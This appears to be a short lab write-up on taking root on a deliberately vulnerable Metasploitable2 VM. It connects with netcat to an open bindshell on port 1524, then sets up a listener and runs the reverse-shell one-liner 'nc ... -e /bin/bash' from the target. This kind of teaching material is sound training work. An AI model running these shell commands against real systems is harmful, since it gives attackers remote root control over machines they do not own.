# Bindshell vs Reverse Shell Exploit

## Tools
* [Kali Linux](https://www.kali.org/get-kali/#kali-platforms) or similar Linux distro
* Metasploit
* Another machine/Virtual machine with [Metasploitable2](https://sourceforge.net/projects/metasploitable/files/Metasploitable2/) or similarly vulnerable OS 

# Steps


1. **Nmap Service Scan**:
    - Initiate an `nmap` scan using the command:
      ```bash
      nmap -sV target_IP -p 1524
      ```
    - This command performs a service version detection (`-sV`) scan on a specific IP and port (`1524`).
    - Results indicate that **port 1524** is open, with a service running as `bindshell` on the **Metasploitable** system.
  
      ![Screenshot_2024-10-06_17_47_011](https://github.com/user-attachments/assets/b4f0f88d-a1a1-45d5-b525-d5653f8e0222)

2. **Netcat Connection**:
    - After identifying the open port, connect to the target machine using `netcat` with the command:
      ```bash
      nc target_IP 1524
      ```
    - Upon connection, we access a **root shell** on the target Metasploitable machine, as indicated by the `whoami` command output:
      ```
      root
      ```
      ![Screenshot_2024-10-06_17_47_01](https://github.com/user-attachments/assets/7c4bcc37-640a-477b-98eb-d7bede9113c4)

3. **Directory Listing**:
    - run the command:
      ```bash
      ls -all
      ```
      to show this is the ROOT directory on the target.

---


1. **Netcat Listener**:
    - To set up a **Netcat listener** on the Kali machine use the command:
      ```bash
      nc -nlvp 5555
      ```
    - This command opens a listening socket (`-l`) on port `5555` while allowing verbose output (`-v`) and disabling DNS lookups (`-n`).
    - The listener is now waiting for incoming connections on this port for reverse shell purposes.
![Screenshot_2024-10-06_17_49_53](https://github.com/user-attachments/assets/d19f75de-016c-46be-a595-212deac34715)

---

2. **On the Target Machine**
On the Metasploitable machine, the command:
```bash
nc 192.168.1.116 5555 -e /bin/bash
```
  is executed to gain a fully interactive reverse shell on the main machine

The attacker now has a fully interactive reverse shell on the Metasploitable machine.

---

3. **Hostname and User Check**:
    - Execute the following commands to verify details about the target system:
      ```bash
      hostname
      whoami
      ```
    - The target's hostname is `metasploitable` and the user running these commands is `root`, confirming full access to the system.
    ![Screenshot_2024-10-06_17_52_31](https://github.com/user-attachments/assets/aa73f348-3e82-46b7-95c2-33623a31a0fe)



---

## Conclusion

In this lab exercise, we exploited an open `bindshell` service running on the vulnerable Metasploitable machine via port 1524. After successfully gaining root access, we could do anything like view the contents of the root directory. We then set up a **Netcat listener** on the kali machine and a **Netcat reverse shell** on the target machine on port 5555. Finally, we verified the network configuration and identity of the target machine to ensure full control over the compromised system.
